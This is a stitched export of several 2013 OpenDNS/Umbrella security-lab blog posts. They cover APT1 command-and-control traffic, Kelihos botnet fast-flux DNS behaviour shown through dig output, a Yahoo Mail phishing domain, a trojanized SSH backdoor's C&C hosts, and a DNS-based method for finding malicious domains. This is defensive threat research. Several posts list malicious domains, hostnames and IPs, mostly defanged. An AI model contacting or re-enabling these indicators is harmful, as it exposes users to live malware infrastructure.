that# should never ever be reused with the same key.nonce = Crypto::Random.random_bytes(24)ciphertext = alice_box.box(nonce, \'message\')\n# Bob verifies and decrypts Alice\'s messagebegin  message = bob_box.open(nonce, ciphertext)  puts(message)rescue Crypto::CryptoError  STDERR.puts(\"Ciphertext failed verification\")end\nPrivacy and security are important concerns, and cryptography is a critical building block to achieve these.', 'Open Source;Security Research', 'https://umbrella.cisco.com/blog/2013/03/06/announcing-sodium-a-new-cryptographic-library/');

As the research team sat through the first few speeches during BSides, it became clear how pointedly apparent the risks of the security landscape are today.\nWhile the technologies behind backdoors and exploit code are becoming increasingly more sophisticated, so too are the graphic design, research, targeting, and convincing nature of attacks. Talks from Phishme.com, EnergySec, MalwareBytes, KindSight, Twitter, and Mandiant illustrated how cybercriminals are becoming much more design oriented, and are putting more effort into betraying the trusting nature of their targets.\nThe reigning trends from these events seemed to be as follows: spear phishing is here to stay; state-sponsored groups are getting more involved; the design and architecture of malware and botnets are becoming a sophisticated cottage industry; and security companies need to collaborate more to change the game and the fight against cybercriminals.\n1. The Converse All-Star of Malware\nSpear phishing attacks remain a go-to choice for cybercriminals. About 91% of all attacks begin with a spear phishing attempt, according to a TechWorld report. As highlighted in multiple presentations at BSidesSF, the engineering, design, and hosting efforts of botnets and spear phishing operations rivals those of some Fortune 500 companies. A good example is the recently discovered Adobe PDF ransomware that redirects to a phony Adobe site designed as a spitting image of the real thing.\nMore often attackers are taking effort to design more convincing company letterhead and logos for phishing attacks. They are even using techniques akin to investigative journalism research to find personal info on their targets (SCADA Protection: Imminent Phishing Attacks and the US Cyber strategy). Aspects like design and hosting are increasingly being offered as services for purchase to those looking to run a botnet without the effort of engineering one.\n2. Going Mobile\nThe security community has conceded that BYOD is here to stay. Any security policies put in place, if companies are smart about them, should include plans for protecting a mobile workforce. Kevin McNamee from Kindsight gave a provocative talk on Android botnets. In it, he mentioned the rising sophistication of spurious Android app stores that will deliver apps packaged with malware. Android device users can find themselves unknowingly installing a “trojanized” popular app that transforms the device into a bot (Build Your Own Android Botnet).\n3. Getting Help from a Huge Backer\nThe reality with malware and the levels of espionage we’ve seen, as in the case of APT1 (see our analysis in a previous blog post), is that there’s money to be made in this game. And in a talk from Christopher Lew at Mandiant, we heard about the reality of state-sponsored attacks, that can take years of preparation and execution, and leverage “massive” financial and technical resources to achieve their goals (Chinese Advanced Persistent Threats: Corporate Cyber Espionage Processes and Organizations). The persistence level seen in recent attacks make them difficult to trace and mitigate. But, according to Lew, the first step is figuring out what the attackers want and how they will go about getting it.\n4. Betraying User Trust\nMalvertisement attacks that exploit trust between ad networks and content publishers are ramping up and becoming trickier to catch because they get a free pass around domain/IP reputation systems. When an agency like RSA or Bit9 with a secure reputation gets compromised, systems programmed to trust these authorities are wide open to attackers to do things like distribute malware. We see increasing instances of stolen certificates or fraudulently issued ones that are used to sign malware to evade detection or used by cybercriminals to conduct “man-in-the-middle” attacks directed at users of legitimate online services or to fake the authenticity of malicious sites in phishing attacks. In an effort to mitigate these last threats Twitter is now serving everything to everybody using HTTPS as it was pointed out in the “SSL++: Tales of Transport Layer Security at Twitter” talk. In this talk, the speaker also reviewed several mechanisms for web browsers that mitigate common browser attacks. Such mechanisms include protocol downgrades, HSTS, CSP, canonical links, and clickjacking defenses. He also described Twitter’s decision to release their “secureheaders” gem, which automatically enforces these mechanisms for safer browser content delivery.\n5. Graphing the Security Landscape\nThe rapidly changing landscape means that we will all need to continue efforts toward collaborating and sharing to keep ahead of the criminals. And the Umbrella Security graph is our offering toward that effort. It is a tool others eventually will be able to use to build their own algorithms and domain research. Collaborators can use the security graph for their own investigation, and make use of the interface to tap into Umbrella’s data, scores, and correlation.\nWiFi issues and possible malware infections aside :), our presentation at BSidesSF and the demos we were able to give at the post-RSA event at the OpenDNS office gave people a chance to see what’s to come. The security graph will put the power of our Big Data into the hands of smart researchers in need of effective tools.\n\nLooking Ahead\nTo say the least, our participation in RSA and BSidesSF reassured us that the launch of Umbrella and our recent work to produce cloud-delivered security tools and Big Data research methods are essential building blocks to equip the security community to fight tomorrow’s threats. Because today, the current strategies are not keeping pace with the criminals.\nBuilding the security tools of tomorrow also means effectively harnessing the Big Data available today. The Umbrella Security graph presentation at BSidesSF wowed those in attendance, and for good reason. Dan Hubbard and Frank Denis illustrated what can happen when it’s possible to harness the power of Big Data and use it to gather predictive intelligence about malicious sites, botnets, and malware hosts.\n\nAs the week comes to an end and we reflect on everything we witnessed and learned from our peers, we remain emboldened that our approach is spot on.', 'Security Community;Security Graph;Security Research', 'https://umbrella.cisco.com/blog/2013/03/01/top-five-trends-at-bsides-securitys-off-rsa-alternative/');

According to the security researchers, one target was a company with remote access to more than 60 percent of oil and gas pipelines in North America. The unit was also among those that attacked the computer security firm RSA, whose computer codes protect confidential corporate and government databases.”\nMuch has been disclosed about the recent attacks, but our team wanted to investigate the traces of APT1 available from our massive data sets in order to get a better idea of how close this threat is to our customers. We also wanted to generalize the observed behavior of these traces into good heuristics for future discoveries and to spot anomalies or potentially-hidden links that could shed light on APT1’s infection vectors.\nWe uncovered some fascinating results through our research. Of the 2,046 APT1 command and control (C&C) domains we looked at, 98% are stealth operators, showing only 0-100 daily requests. However, a few domains receive tens of thousands of requests in a single day. The traffic volume is consistent across all hours, indicating script behavior.\n[ traffic pattern shown in sgraph]\n\nAmong all the IP addresses contacting these APT1 C2 domains, we spotted only two Chinese IP addresses, which is especially interesting because the attack has been widely-claimed to be China state-sponsored. However, considering the strong Internet censorship in China, it isn’t unlikely that a particular organization or ethnic group could be hacked by their own government.\n\n\n\nLike Mandiant, our research also indicates that targets exist across multiple countries and industries.  Top targets include telecommunication carriers, petroleum companies and large-scale business infrastructure providers.\n[one victim IP is mapped to Korea Telecom]\n\n[a screen shot of the home page of a large European dedicated server hosting provider]\n\nAlthough we know that spear phishing was the primary infection vector, it is not yet clear or disclosed how many of the other infections transpired. The C2 names were clearly carefully-composed to easily confuse people with trusted news or service sites, such as “nytimesnews.net”, “firefoxupdata.com”. As we mentioned earlier, we used the Umbrella Security Graph to apply co-occurring pattern discovery. Co-occurrence measures the frequency of each pair of domains being requested by the same person across the population of all clients in a small time window. (You can watch a video demo here on how this technique was also used to investigate the NBC.com injection.) Most importantly, co-occurance pattern discovery allows us to surface undiscovered connections between threats.\n\nThe list of domains below have exclusively co-occurred with one of the APT1 C&C domains within a small, pre-set time window. Nine of them are known malicious sites, and include drive-by downloads, spam, Fake AV and phishing threats. Looking closely at these threats, we recognize ff-demo.blogdns.org, a domain associated with the FinFisher/FinSpy spying tool that is reported to be used by certain governments to spy on domestic activists (you can read more about it here).

Why join the community? In the most recent Umbrella Security Labs webcast we exposed how our research team is using advanced Big Data mining tactics to classify and categorize websites. The Labs community members are on the front lines of predictive threat research, as they’re able to submit malicious and potentially malicious domains for community review and discussion. The community is made up of security researchers, IT technicians, and software engineers from all around the globe with strong dedication for keeping the Internet safe and secure.  For more information about how the whole process works, click here.\nTo underline how valuable Umbrella Labs Security community members are, I want to introduce you to one of the community’s top contributors. Meet Conrad, an IT security analyst and part-time technical writer.\n\nOpenDNS: How did you get started in Internet security? Conrad: I started in the 1980s when messing around with other people’s computer systems was regarded as an intellectual challenge and, certainly as a student, I made a real pest of myself on University mainframes. I got into quite a lot of trouble all the same, but I learned a lot about both sides of the security field. A lot of the techniques used back in the 1980s still work today, especially social engineering and fake login pages. The movie “WarGames” was hugely influential on many people from my generation, plus the BBC Thriller “Bird of Prey.”\nOpenDNS: Have you ever been a victim of a scam or malware?Conrad: Apart from the occasional bad seller on eBay, scammers seem to have missed me. It depends what you regard as a scam though. In over twenty years of dealing with malware professionally, I’ve only been infected once and it ended up being a slip of the mouse when I was sending a sample to our vendor for analysis. I’ve certainly had to clean up lots of other people’s machines, though!\nOpenDNS: What’s the most convincing scam you’ve ever seen, malware or otherwise?Conrad: I recently came across an interesting case where an organization in the U.S. was running fake seminars in the education sector. They reeled in millions of dollars and left hundreds of unhappy people behind – but at least they eventually stopped when I identified who was running it and published the whole sordid story.\nOpenDNS: Besides OpenDNS what are you favorite tools of your trade to use?Conrad: There are so many good tools out there, but I think one basic one that security researchers really need is a subscription to DomainTools. On top of that there are binary analysis tools such as VirusTotal, Anubis, Comodo’s CAMAS and ThreatExpert. For online analysis Wepawet, Jsunpack and URLquery are all very useful. WGET and SamSpade for Windows are useful tools for poking around at web resources safely. It is useful to know some sort of scripting or programming language so that you can take data from one tool and analyse it in another. It’s also pretty essential to keep up with assorted security blogs to have an idea of what is actually happening right now. And basic things such as poking around your spam folders and internet access logs are essential things for anyone working for a large organisation.\nOpenDNS: What do you most enjoy about being a moderator ?Conrad: Being a moderator makes it possible to get active and emerging threats blocked very quickly. A lot of malware domains are active for 24 hours or less, so it is quite satisfying to be able to block them in time to do some good.\nIf you’re interested in joining Conrad and the Umbrella Labs Security Community, just apply online and let us know why you’d make a great contributor to the community.', 'Security Community;Security Research', 'https://umbrella.cisco.com/blog/2013/02/22/umbrella-security-community-member-interview-conrad/');

Blocking all sites and actively whitelisting safe ones may lead to many headaches depending on your organization or userbase’s need.

I’ve talked to many of the Higher Ed IT and security teams that deployed the service, and the same themes arise again and again. Mostly, their problems relate to scale. Traditional security appliances that perform deep packet inspection or proxy all network traffic just aren’t equipped to handle unusually large bandwidth needs of colleges and universities. They end up creating network bottlenecks and other performance issues. It’s also extremely expensive to stay up-to-date and avoid single points of failure.\nTake for example Tri-County Technical College (TCC). The community college network serves 6,000 students across four campuses. The sheer volume of bandwidth that TCC needs to accomodate both university and student-owned devices eliminated the possibility of using most appliance-based Secure Web Gateways. A scalable, on-demand service wasn’t just the obvious choice, it was the only one that could secure all devices connecting to TCC’s network at any given time.\nVanderbilt University gave us another great example of the challenges facing Higher Education. Vanderbilt caters to the needs of more than 35,000 students, staff and faculty. Like many universities, Vanderbilt’s IT team attempted to get ahead of malware issues by offering students and faculty a client to download. But, there were just too many types of devices for this approach to malware protection to be scalable. The only way to effectively (and easily) protect every device that connected to Vanderbilt’s distributed networks, was to deploy DNS-based Internet security at the network layer.\nWe’re hosting a webcast for Higher Ed next week to discuss the benefits of cloud-delivered Internet security in college and university environments.

A recent transplant from our Vancouver office to our San Francisco headquarters, Serra spends her days providing world-class customer support to Umbrella customers.\nDear early adopters,\nI spend my days helping people navigate the murky waters of the technological forefront. My experiences over the past several years have taught me that if you’re an early adopter, challenges are almost inevitable. You might get the fastest new graphics processor before all of your friends, but there’s a good chance your new shiny toy might accidentally eat your address book or refuse to run that multiplayer skifree emulator you downloaded back in 1997. Things will break, capacities will be blown, bugs will surface, and sadness will occur. But if you’re lucky, the fruits of your frustration will eventually flourish into something amazing that your luddite friends like me will longingly covet while they spin the wheels on their rotary dial phones.\nIn a world where the Next! Big! Thing! happens on a rapid, 3-month release cycle, I sometimes feel like a luddite. When my iPhone 3GS met an untimely (and wet) end a couple months ago, I begrudgingly upgraded to an iPhone 4, even though I could have gotten the new hotness that is an iPhone 5 for a just small amount more.\nIt wasn’t that frugality got the best of me. I’m just not an early adopter.\n\n\nBut you, early adopters, are an essential part of what makes the technological world go ’round.\nYou’re willing to hack, stumble and fight through early release cycles for a chance at eventual triumph. Without you, it would take companies like ours so much longer to work through issues. Without your feedback, the designers, engineers and product managers behind the products you love wouldn’t be able to effectively iterate, adapt, improve, overcome – and most importantly – focus.\nWithout early adopters and beta testers, Umbrella customers might still be wandering around the first version of the Umbrella Dashboard. When we launched in November 2012, there were bugs. There were features missing. There were parts of the user experience that were confusing. But thanks to early adopters, we’ve been able to find and fix a lot of bugs in a very short period of time. You told us what you liked, what you hated and what you found confusing. You reminded us of features we forgot, and have been ever-so-patient while we’ve worked hard to improve every aspect of the experience. (Case in point: we just rolled out a new policy wizard and a the ability to filter noisy reporting data is coming very soon.)\nOur first wave of Umbrella Mobility customers have a special place in my heart. I’ve spent the majority of my waking (and sometimes dreaming) hours since Umbrella’s launch ensuring your roaming laptops are not only up and running, but also encrypted, protected and – most importantly – as reliable as our core DNS infrastructure. Believe it or not, it’s no simple task to design a lightweight security agent that can be flawlessly installed on any laptop, taken off a secure corporate network, and randomly plunked into a network run by cupid-only-knows who, without breaking anything. But that’s what we’re doing well today, thanks in large part to the powerful feedback we received from early adopters.

Although it was taken down by the combined initiatives of Microsoft and Kaspersky Labs in 2011, and again by the Kaspersky Labs and several security firms in 2012, recent research shows that it has emerged again.\nThe Kelihos botnet is used for information stealing (such as passwords and virtual currency) in addition to serving as a spam bot.  It was pointed out by Kaspersky labs following the second reemergence of Kelihos in 2012 that the botnet is most likely relying on a pay per install (PPI) service. In a PPI scheme, the bot operators (or clients wanting to deploy a malware on a large scale) buy or rent the botnet infrastructure (infected hosts) to build their network and launch their operation. We observed that most of the compromised hosts serving the botnet are located in Asia and lots of them are running Windows XP (and later versions) with open ports 49152 to 49157, which might indicate that hosts in Asia are a cheaper commodity to buy (or rent) compared to other countries.\nGeorge Washington University, which uses Umbrella by OpenDNS for malware protection across its entire campus, reached out to us with intelligence related to Kelihos.  Here’s a look at the research we conducted on the case.\nThe cybercriminals behind the new Kelihos botnet have decided to use a vast panoply of evasion techniques both within its malware and network components. This is making the botnet more resilient to host-based detection and sinkholing/blacklisting. Kelihos uses a new malware sample that operates in “slow motion” by making sleep calls with long timeouts in an attempt to evade automated analysis. A detailed investigation of the malware sample is available here.\nFrom the network perspective, there are a few hundred different domains serving as command-and-control or malware distribution domains for the botnet, with which the malware component of an infected client machine attempts to communicate.The majority of these domains are registered under the .ru (Russia) and .ms (Montserrat) ccTLDs with a few under .eu (European Union), .in (India) and .com.Almost all of these domains were registered in the past 6 months. 74 domains were all registered in bulk on January 13th, 2013.The figure below shows the number of domains registered on each date since early 2012.\n\nThese domains show a strong case of fast flux behavior used on multiple layers.First, we observe that every domain (let’s take for example girwysca[.]ru) resolves to a single IP with a Time To Live (TTL) of 0 seconds (shown in the dig excerpt below). This means the A record of the domain is never cached, and the recursive DNS resolver that the infected client uses will always query the authoritative name server of girwysca[.]ru for a new IP address.\n;; QUESTION SECTION:;girwysca[.]ru. IN A\n;; ANSWER SECTION:girwysca[.]ru. 0 IN A 46.211.53.6\nAs mentioned, due to the fast flux nature of these domains the IPs were constantly changing. Collectively, we saw that the Kelihos domain names we studied resolved to a pool of 31,414 different IPs (and still growing) spread across 1920 ASNs and 143 countries. Most hosts are located in Asia (India, Ukraine, Russia, China and Pakistan).\n\n\nAs an example of this fast fluxing of IPs, we use our in-house passive DNS database to show the evolution of unique IPs that the domain girwysca[.]ru has resolved to over time. The data is sampled from one resolver in our London datacenter. Notice that the domain girwysca[.]ru was registered on December 7th, 2012, and it started resolving to IPs according to our data just 4 days after its registration.\n\nSecond, the Kelihos domains that we analyzed show an inconsistency in the setup of their name servers. This inconsistency could be used to the cybercriminals’ advantage, as two layers of name servers can serve as evasion and redundancy techniques for the botnet. As an example, let’s again take the domain girwysca[.]ru. We show the main part of the output of a dig +trace A girwysca[.]ru below.\ngirwysca[.]ru. 345600 IN NS ns4[.]newrect[.]com.girwysca[.]ru. 345600 IN NS ns2[.]newrect[.]com.girwysca[.]ru. 345600 IN NS ns3[.]newrect[.]com.girwysca[.]ru. 345600 IN NS ns5[.]newrect[.]com.girwysca[.]ru. 345600 IN NS ns1[.]newrect[.]com.girwysca[.]ru. 345600 IN NS ns6[.]newrect[.]com.;; Received 148 bytes from 193.232.142.17#53(e.dns.ripn.net) in 169 ms\ngirwysca[.]ru. 0 IN A 113.255.226.230;; Received 56 bytes from 94.154.224.58#53(ns2[.]newrect[.]com) in 363 ms\nThe name server replying with the IP of girwysca[.]ru is ns2[.]newrect[.]com, which is one of the name servers listed at the parent name server e.dns.ripn.net (one of the authoritative name servers for .ru). The NS record for ns2[.]newrect[.]com has a TTL of 345600 seconds (4 days) which is a reasonable duration for a stable name server. So far, so good.\nNow, if we issue a dig +trace NS girwysca[.]ru to query explicitly for the name servers of girwysca[.]ru, we get the reply displayed below (an excerpt):\ngirwysca[.]ru. 345600 IN NS ns1[.]newrect[.]com.girwysca[.]ru. 345600 IN NS ns6[.]newrect[.]com.girwysca[.]ru. 345600 IN NS ns5[.]newrect[.]com.girwysca[.]ru. 345600 IN NS ns2[.]newrect[.]com.girwysca[.]ru. 345600 IN NS ns3[.]newrect[.]com.girwysca[.]ru. 345600 IN NS ns4[.]newrect[.]com.;; Received 148 bytes from 194.85.252.62#53(b.dns.ripn.net) in 219 ms\ngirwysca[.]ru. 0 IN NS ns1[.]girwysca[.]ru.girwysca[.]ru. 0 IN NS ns2[.]girwysca[.]ru.girwysca[.]ru. 0 IN NS ns3[.]girwysca[.]ru.girwysca[.]ru. 0 IN NS ns4[.]girwysca[.]ru.girwysca[.]ru. 0 IN NS ns5[.]girwysca[.]ru.girwysca[.]ru. 0 IN NS ns6[.]girwysca[.]ru.;; Received 280 bytes from 114.41.164.228#53(ns5[.]newrect[.]com) in 173 ms\nThe name server replies with a different set of name servers than those reported by the parent name servers.In other words, we saw earlier that there are 6 name servers of girwysca[.]ru that are referred to us by the parent name server b.dns.ripn.net, which are ns1-6[.]newrect[.]com. We will call these “reported-by-parent” name servers.When these name servers are queried directly for the name servers of girwysca[.]ru, they reply with a different set of name servers ns1-6[.]girwysca[.]ru with a TTL of 0 seconds. we will call these “infringing” name servers.Normally, we would have expected to see the same set of ns1-6[.]newrect[.]com in the reply from ns5[.]newrect[.]com.Clearly, this is not conforming to the DNS standard as we can also confirm it by checking the domain on http://www.intodns.com/girwysca.ru\n\nThis could be a misconfiguration, but it is rather suspicious, as we further find out when we query for the IPs that the infringing name servers ns1-6[.]girwysca[.]ru resolve to. In the sample answers we show below, we see that ns1-6[.]girwysca[.]ru also have a TTL of 0 seconds and we observe that they also have a constantly changing and growing set of IPs. This is a case of fluxing of name servers/IPs also known as double flux in addition to the fluxing of domains/IPs discussed earlier. (refer to my presentation about fast flux in our video SF Data Mining Meetup @OpenDNS [minute 31:25] available at http://youtu.be/AeITUpKD944)\n;; QUESTION SECTION:;ns1[.]girwysca[.]ru.

The main 2LD domains of the name servers are shown below with their registration dates.\nboomsco[.]com, 2013-1-13larstor[.]com, 2012-12-22zempakiv[.]ru, 2012-12-07newrect[.]com, 2012-8-1\nFrom the client hosts perspective, we observe sudden spikes in the DNS traffic to the Kelihos domains, as it is shown below for gyvolnac[.]ru on the screenshot of our Sgraph investigative platform interface (we will soon be sharing Sgraph with the security community to use it). Analyzing changes in traffic patterns is one of the techniques we use in our labs to detect new malicious domains.\n\nThis third emergence of Kelihos after recent takedowns highlights the difficulty of eliminating the botnet threat altogether. Umbrella Security Labs is a big advocate of tighter collaboration within the security community and the legal system to fight botnets.

But, it provides insight into how we worked together as a team to launch a new service, and what we were able to accomplish as a result of communication, teamwork and determination.\n‘Not again’, I thought to myself on the train ride in to work. I fired off, “Pants on Fire” across email, text and iMessage (I didn’t think of placing a phone call). I had lost access to the Internet while using the beta version of what would eventually become the Umbrella Mobility iOS VPN Service. Again. But unlike before, this time we were ready.\nWe are extremely proud of the reliability we’ve built into the OpenDNS network infrastructure and operations around DNS (see Andree’s post), but reliability doesn’t come for free. You need to work for it and earn it, and a new team working quickly to deliver an innovative new VPN cloud service had not yet put in the work.\nDuring early development phases of the VPN service, we had trouble even identifying issues. When they arose, it was not clear how severe they were nor who was on point. To solve the problem we developed a common language, a set of expectations of behavior, and committed to visibility and transparency to the whole company. Pants on Fire (PoF) was born.\nPants on Fire means users are affected — they can’t enroll, login, or worst case, access the Internet — while connected to the burgeoning Tahoe (code name for what became Umbrella Mobility iOS VPN service). Pants on Fire means everyone would drop what they were doing and fix the problem. It didn’t matter that this was a beta, or had only a few users. Pants on Fire means afterwards we would figure out why we had an outage. We’d put in more instrumentation to alert us in the future. We’d re-examine our development and test methodologies, our cooperation between dev and ops, so that this wouldn’t happen again (5 Why’s ended up working very well for this.) Pants on Fire means another entry in red and orange on the board for all to see.\nThe board grows. We also have some fun with it. The weeks move DOWN, each new week is a new column to the right. So the earliest day is the upper left, and the most recent is marked 19 (brown pants, not on fire) — the date this picture was taken.\nWith this visibility, patterns change. At first, frequency of updates decreases (fewer big green dots) as we move cautiously. Soon, we gain confidence and accelerate again. Fewer Pants on Fire occur. We set a goal: we won’t ship this unless we go a full four weeks with no Pants on Fire.\nWe approached our release date. We’ve had only one PoF in 6 weeks, but it was 3 weeks ago. Is this good enough? Will we deliver on what our customers expect? We decided to release!\n\nIgnore the smoldering flames, that is just an indication of the pressure around the release, no pants in that vicinity are aflame. Also, no chickens were harmed in the making of Umbrella. The rubber chicken does scream loudly, however, when attention is required. Now, 3 months post-release, we know when the students using our solution get out of school in Hawaii because our instrumentation notes the surge of increased traffic as they all get online at once (we are guessing this is when they get home from school). Most recently, we had a new situation: our alerting triggered us to a potential issue before it could impact any users. We treated it like a PoF and got it addressed before customers were impacted.\n\nSmoke, but no fire!\nShared language and understanding, transparency, and a little fun work hand-in-hand with the technology approaches that we’ve outlined in the past to make sure that we deliver the experience our customers count on.

It’s the key to ensuring that security vendors move from being a step behind cyber criminals to a step ahead of the pace of technological change. Part of achieving this vision involves effectively harnessing and analyzing Big Data so that we can predict unknown threats, rather than simply block known threats.\nThe Umbrella Security Graph enables our researchers to access a global view of Internet connections and traffic patterns and apply sophisticated analytics and scoring capabilities. Combined with machine learning, graph theory and related algorithms, the Umbrella Security Graph allows us to deliver predictive Internet security protection to customers. It’s just the beginning of our move into predictive security intelligence.

This allowed attackers to circumvent the same-origin policy and steal Yahoo Mail users’ cookies and obtain their contact lists. The details of the attack are described here.\nAfter clicking a malicious link, unsuspecting users were redirected to the phishing site www[.]msnbc[.]msn[.]com-im9[.]net, which would appear to many to be legitimate MSNBC content.\nThe phishing webpage belongs to a subdomain of com-im9[.]net. The whois information shows the domain com-im9[.]net was registered on Jan 27th via a Ukrainian registrar but stayed dormant (did not resolve to any IP) for 2 days.\nMining our worldwide DNS query logs, we see that DNS traffic to the subdomain msn[.]com-im9[.]net (which hosts the malicious page) started on Jan 29th 2:32pm UTC, the time at which we believe the campaign to compromise Yahoo Mail users’ accounts was most likely initiated. A spike in traffic of about 3,000 DNS queries is very noticeable for two consecutive days (Jan 29th and Jan 30th), originating from 4,000+ client IPs distributed in 100+ countries. Requests came mostly from the United States, United Kingdom, Canada, Iran and Egypt.\n\n\n\nAs a matter of fact, the culprit webpage www[.]msnbc[.]msn[.]com-im9[.]net resolved to 12 IPs distributed in 5 ASNs and 4 countries (United States, United Arab Emirates, Cyprus and Switzerland) with a low Time To Live (TTL) of 24 minutes. This is a typical behavior of fast flux domains that try to evade blacklisting and takedown.

Two hostnames linuxrepository[.]org and  openssh[.]info were found in the backdoor SSH binary.\n\nIn researching this incidence, communication behavior of this backdoor struck us as extremely interesting.\nWe traced three weeks’ of contacts to the two C&C servers mentioned above. (Data examined is from one single hour each day, collected by our Singapore datacenter). Each day, we observed 60 machines making relatively stable contact. The servers were obviously compromised weeks before the trojan was detected and reported. Interestingly, these servers belong to 4 netblocks in Malaysia.\n\nIt is not known how these servers got infected with the trojanized SSH binary, but it was clearly a network-wide security vulnerability, since a large number of servers on the same network got infected.\nA majority of these compromised servers host up to several hundreds of websites. These websites are owned by different entities according to their registration records. We can easily imagine that hundreds of SSH logins were stolen if they’ve accessed the servers via SSH. The several thousands of hosted websites are very likely already compromised and are being used, or can be used at any minute, to server up malware or the like. Fortunately, we are not seeing much traffic to these risky sites from Umbrella customers. These sites will be closely monitored for security risks, and of course the sites we discovered to be compromised are already being blocked for our customers.\n\nAnother interesting note is that although both hostnames were found in the trojanized binary, the communications to two C&Cs are quite different. Both servers were rarely communicated with by the same compromised machine. Instead of each being used as a backup server for the other, they seem to be communicated with separately based off certain configurations (possibly server system versions).

Each data center hosts tens of DNS resolvers. When a resolver receives a recursive DNS query, it first checks if it has an answer in its cache, and replies with that answer. If there’s no answer in the cache, or if the answer has expired, then it issues a DNS upstream query to the authoritative name servers and passes the response back to the client. In other words, a recursive resolver performs two main operations: reply from its cache, or issue a query up the DNS authoritative name servers chain.\nIn this blog, we discuss a new, simple-yet-effective method of mining for new malicious domains. The technique is based on the responses of authoritative name servers that are hosted on IPs tied to known suspicious or malicious domains.\nIn authoritative DNS traffic, each DNS message has the IP of the name server that sent the reply followed by the raw DNS message. A sample authoritative DNS message is displayed below. The IP address of the name server that sent back the message is 216.239.34.10. Since the Authoritative Answer (AA) bit is set, we know that 216.239.34.10 is one of the authoritaitive name servers for www.google.com. (A domain can have multiple authoritative name servers, and many do as it is preferable for redundancy). Notice that in this packet, there are no Authority or Additional sections.\n1216.239.34.10:53id 19910opcode QUERYrcode NOERRORflags QR AApayload 512;QUESTIONwww.google.com.

These domains are then used for all kinds of malicious purposes: phishing or scam sites, malware hosting, distribution or drop sites, or rendezvous points for botnets to receive payloads and directives.\nThrough the domain registration process, entries for one or multiple name servers authoritative for the new domain are added to the zone of the domain higher up in the DNS hierarchy. For instance, if we register the domain, example.com, and provide ns1.example.com and ns2.example.com as name servers for example.com then new NS records for ns1.example.com and ns2.example.com are added in the .com zone.\nThe registrant could also use name servers provided by his hosting provider if he does not want or need to deal with managing his own DNS name server.\nThen, at the authoritative name servers level (ns1.example.com and ns2.example.com in this example), new A records for the new domain are added (if the new domain needs only to map to IP addresses), where the domain name is made point to one or multiple IP addresses.\nThese IPs are the hosting machines for the new domain’s content, or could be a proxy to forward traffic to another layer of domains, IPs.\nIn the case of domains registered for malicious purposes, the hosting machines for the domain can be picked from general-purpose hosting providers or infected machines of unsuspecting users.\nNew malicious domains discovery method\nOne of the intuitions behind this method comes from the observation that malicious domains and their respective name servers are often hosted on the same IP or a close range of IPs that are recycled. This obviously can be used by legitimate sites, since acquiring a new IP range is not free, so the hosting usage of IPs is maximized like in the case of virtual private servers. Nevertheless, this practice is rather prevalent in the case of malicious domains and it provides a ground for this method that we explain in the following section.\nWe parse the authoritative DNS logs and for each authoritative DNS answer, we check the IP of the nameserver that issued the response to see if it exists in our database of malicious IPs. We extract all DNS messages that were issued by nameservers whose IPs have been active recently and that have a high number of malicious domains mapping to them. Then, we mine the Answer section of each message and extract every domain, IP pair when it is an A record. This list of domain, IP pairs constitutes candidates for further investigation to decide if the domains are indeed malicious or not.We first exclude discovered domains that appear in our domains’ whitelist as well as those domains that are already known to be malicious. Our goal is to discover new malicious domains, therefore, the remaning list of domains is checked with several classification heuristics like for example keeping only those domains that are part of dense clusters of malicious domains and IPs, or domains whose names have high lexical perplexity and entropy (check our blogs  “How Likely is a domain to be malicious” of January 8th and “The role of country code top-level domains (ccTLDs) in malware classification” of January 18th), or domains that have been very recently registered and are parked pages.\nAs an illustrative example, we take a sample of one hour worth of DNS authoritative logs from one resolver in our London data center. That represents about 5,316,930 DNS messages. After applying our domain discovery method, we identify several hundred new suspicious or malicious domains.\nA sample of newly discovered malicious domains is presented below:\nwww[.]alexaa[.]netwww[.]finansium[.]fiwormix[.]in[.]uahancerlilerbakir[.]orgqniceclubluxurysp[.]comwww[.]dvmcomp[.]ruxn--habervaktm-5ub[.]afaqe2e[.]commbkk[.]comgustavomaciel[.]comvrguyjjxorlyen[.]comzzbgzv329sbgn56[.]comempsqyowjuvvsvrwj[.]comkarenburnsart[.]comviaton[.]ruwww[.]costarica-luxury-vacations[.]comwww[.]qluxurylinenicesp[.]comthreeamigos[.]com[.]ausukcesjestblisko[.]cba[.]plcolume[.]netwww[.]svonni[.]com\nThe main goal of the Umbrella security labs is to experiment with and apply a wide variety of techniques and algorithms for discovering malicious domains by mining through our Big Data platform that consists of both recursive and authoritative DNS traffic as well as other intelligence sources. At the end, we retain those methods that are the most efficient and effective in bringing up added value in protecting our customers.', 'Big Data;Malware;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/01/19/discovery-of-new-malicious-domains-using-authoritative-name-server-traffic/');

Indeed, we confirmed that some countries are hosting a significantly higher ratio of malicious sites than clean sites. But rather than rest on a superficial assumption based on the geography of where a domain is hosted, we wanted to more deeply explore the relationship between geography, ccTLDs and malicious domains.\nUnlike generic top-level domains (.com, .net) that most anyone can buy, an Internet country code top-level domain (.fr, .tw) is generally reserved for a country or a dependent territory. If a website is using a specific ccTLD, it suggests that its operator’s intention to target a local audience. That said, registrars have largely relaxed the rules and a lot of ccTLDs can now be registered by non-local businesses and individuals, possibly rendering ccTLDs less relevant.\nThe co-occurrence matrix between ccTLDs and the actual countries clients are connecting from shows a strong correlation. Most often, websites opting for a country-specific domain are actually serving content for a local audience.\n\nLooking deeper, we observe very different frequency distributions when comparing ccTLDs, that can be explained by linguistic and cultural factors. Building ccTLD-specific models is thus critical in order to help us decide whether to classify a domain as benign or malicious. Below, I’ll discuss some of the specific models we use.\nThe servers’ physical geographic diversity\nThe number of IP addresses and the stability of the set of IP addresses are important signals when determining whether a domain is likely to be malicious. But, it’s also very common for totally benign domains to also use multiple IPs. This is a common practice for load balancing, redundancy, optimizing latency for a large country, or to take advantage of “elastic” infrastructures.\nIn the following experiment, we use two training sets of .RU domain names, containing only domain names resolving to more than one IP address. All IP addresses seen over a one-week period were considered. One list contains domains known to be benign and the other list contains domains known to be currently used as infection vectors.\nOn these two sets, we computed the mean distance between the country’s geographic median and all the physical locations of servers hosting a name.\n\nWe observed a significantly different skewness. Hosts serving a non-malicious domain tend to be geographically close, whereas a domain serving malware can be served by hosts spread all around the globe.\nLooking at the number of distinct physical locations also shows how malware can use a fast flux pattern. Fast Flux is a specific category of domains that take advantage of the fact that the set of IP addresses returned for a domain name is only valid for a limited period of time, over which the domain owner has full control. A botnet operator can leverage this feature to very quickly switch to a different set of hosts in order to serve a malicious payload.\n\nWhile 98% of benign domains having multiple IP addresses are only served by at most 3 datacenters, and show a negligible number of outliers, we see that malicious domains can very quickly hop from one host to another. One of them even scored 867 physical 